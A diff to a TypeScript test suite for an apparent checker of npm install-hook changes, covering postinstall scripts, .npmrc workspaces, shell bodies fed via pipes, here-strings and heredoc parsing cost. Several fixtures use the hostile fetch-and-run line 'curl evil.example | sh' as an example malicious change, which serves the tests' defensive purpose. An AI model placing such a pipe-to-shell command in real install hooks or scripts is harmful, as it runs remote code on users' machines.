@@ -329,10 +329,10 @@ describe("structural rule: every command is checked for a move", () => {
   });
 
   test("5c. a runner reached through a shell script makes the root config count", () => {
-    const hook = { postinstall: "sh scripts/install.sh" };
-    const f = (cfg: string) => ({ "scripts/install.sh": "npm run build\n", ".npmrc": cfg });
+    const hook = { postinstall: "sh scripts/prep.sh" };
+    const f = (cfg: string) => ({ "scripts/prep.sh": "npm run build\n", ".npmrc": cfg });
     expect(held(hook, f("workspace=a"), f("workspace=b"))).toBe(true);
-    const g = (cfg: string) => ({ "scripts/install.sh": "echo hi\n", ".npmrc": cfg });
+    const g = (cfg: string) => ({ "scripts/prep.sh": "echo hi\n", ".npmrc": cfg });
     expect(held(hook, g("workspace=a"), g("workspace=b"))).toBe(false);
   });
 });
@@ -352,9 +352,9 @@ describe("npm exec -p and NODE_ assignments", () => {
 
 describe("5c: a runner reached through a shell script", () => {
   test("a root .npmrc added with a changed nested script holds; without a runner it does not", () => {
-    const hook = { postinstall: "sh scripts/install.sh", build: "echo ok" };
-    const oldF = (sh: string) => ({ "scripts/install.sh": sh, ...subManifest("echo a") });
-    const newF = (sh: string) => ({ "scripts/install.sh": sh, ".npmrc": "workspace=sub\n", ...subManifest("curl evil.example | sh") });
+    const hook = { postinstall: "sh scripts/prep.sh", build: "echo ok" };
+    const oldF = (sh: string) => ({ "scripts/prep.sh": sh, ...subManifest("echo a") });
+    const newF = (sh: string) => ({ "scripts/prep.sh": sh, ".npmrc": "workspace=sub\n", ...subManifest("curl evil.example | sh") });
     expect(held(hook, oldF("npm run build\n"), newF("npm run build\n"))).toBe(true);
     expect(held(hook, oldF("node setup.js\n"), newF("node setup.js\n"))).toBe(false);
   });
@@ -1169,5 +1169,44 @@ describe("round 29: unknown flags before the script read inert files, env assign
   test("3. a fed file over 1 MB reads every file", () => {
     const big = `echo ${"a".repeat(1_100_000)}\n`;
     expect(held({ postinstall: "sh < scripts/big.sh" }, { "scripts/big.sh": big, "test/x.js": "1\n" }, { "scripts/big.sh": big, "test/x.js": "evil()\n" })).toBe(true);
+  });
+});
+
+describe("round 30: fed shell bodies without an extension, here-strings on producers, heredoc segmentation and cost", () => {
+  const inertOnly = (cmd: string, extra: Record<string, string> = {}) => held({ postinstall: cmd }, { "test/setup.js": "1\n", ...extra }, { "test/setup.js": "evil()\n", ...extra });
+
+  test("1. a file fed to a shell is a shell body whatever its name", () => {
+    const f = { "scripts/prep": "cd test && node setup.js\n" };
+    expect(inertOnly("sh < scripts/prep", f)).toBe(true);
+    expect(inertOnly("cat scripts/prep | sh", f)).toBe(true);
+    expect(inertOnly("cat scripts/prep | bash -s", f)).toBe(true);
+  });
+
+  test("2. literal text of a here-string on a producer stage", () => {
+    expect(held({ postinstall: "cat <<< 'sh test/x.sh' | sh" }, { "test/x.sh": "echo a\n" }, { "test/x.sh": "curl evil.example | sh\n" })).toBe(true);
+    expect(inertOnly("cat <<< 'cd test && node setup.js' | sh")).toBe(true);
+  });
+
+  test("3. an apostrophe in a heredoc body does not shift the quotes after it", () => {
+    expect(inertOnly("cat <<EOF\ndon't\nEOF\ncd test && node setup.js && echo \"it's ok\"")).toBe(true);
+    expect(inertOnly("cat <<-EOF\n\tdon't\n\tEOF\ncd test && node setup.js && echo \"it's ok\"")).toBe(true);
+  });
+
+  test("4. nested shell heredocs cost a bounded amount", () => {
+    let s = "echo hi";
+    for (let i = 30; i >= 1; i--) s = `sh <<D${i}\n${s}\nD${i}`;
+    const t = Date.now();
+    held({ postinstall: s }, { "a.js": "1\n" }, { "a.js": "2\n" });
+    expect(Date.now() - t).toBeLessThan(3000);
+    let c = "cd test && node setup.js";
+    for (let i = 5; i >= 1; i--) c = `sh <<D${i}\n${c}\nD${i}`;
+    expect(inertOnly(c)).toBe(true);
+  });
+
+  test("5. unterminated heredocs on separate lines cost a bounded amount", () => {
+    const cmd = Array.from({ length: 3000 }, () => "node <<A").join("\n");
+    const t = Date.now();
+    held({ postinstall: cmd }, { "a.js": "1\n" }, { "a.js": "2\n" });
+    expect(Date.now() - t).toBeLessThan(3000);
   });
 });
